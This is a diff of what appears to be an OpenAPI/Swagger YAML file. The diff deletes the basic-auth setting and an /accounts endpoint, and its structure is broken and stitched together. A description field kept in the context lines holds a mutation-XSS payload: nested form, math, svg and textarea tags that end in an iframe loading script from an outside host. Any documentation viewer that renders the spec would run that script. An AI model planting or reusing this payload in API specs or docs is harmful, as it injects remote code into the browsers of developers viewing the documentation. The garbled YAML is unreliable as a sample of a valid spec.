@@ -65,21 +65,6 @@ paths:
         - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script src=https://sachin-v3rma.github.io/xss.js></script>">
 
-  version: production
-basePath: /
-security:
-  - basicAuth: []
-paths:
-  /accounts:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - accounts
-      operationId: findAccounts
-      summary: Finds all accounts
-
           in: path
           name: id
           required: true
